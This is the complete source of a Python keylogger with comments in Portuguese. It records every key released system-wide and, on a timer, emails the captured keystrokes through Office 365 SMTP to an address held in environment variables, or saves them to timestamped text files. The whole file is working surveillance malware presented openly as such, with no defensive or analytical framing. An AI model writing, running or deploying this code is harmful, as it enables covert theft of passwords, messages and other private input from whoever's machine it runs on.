import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
from dotenv import load_dotenv

load_dotenv()

# Define as variaveis globais que serão utilizadas
SEND_REPORT_EVERY = int(os.getenv("SEND_REPORT_EVERY")) # tempo de wait do algoritmo para fazer e enviar o relatório
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")  # email que sera enviado o relatório pelo smtp
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD") # senha do email


class KeyLogger:
    # Define o init do Objeto KeyLogger
    # (interval = wait para gerar o relatório, report_method = tipo de método (email or file))
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # O objetivo desse método é processar um evento recebido e adicionar informações a um registro (self.log).
    def callback(self, event):
        name = event.name  # evento recebido

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    #  objetivo desse método é atualizar o nome de arquivo (self.filename)
    #  com base em duas variáveis de data e hora: start_dt e end_dt.
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:19].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:19].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # O objetivo desse método é salvar o conteúdo do registro (self.log) em um arquivo de texto
    # se a opção escolhida for file
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    # O objetivo dessa função é preparar um e-mail contendo uma mensagem fornecida como argumento.
    def prepare_email(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "KeyLogger Logs"

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    # O objetivo dessa função é enviar um e-mail contendo uma mensagem fornecida,
    # usando as credenciais de e-mail e senha fornecidas.
    def send_email(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_email(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an Email to {email} containing: {message}")

    # O objetivo dessa função é gerar um relatório das atividades registradas pelo keylogger.
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.log = ""
            self.start_dt = datetime.now()

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keyLogger")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

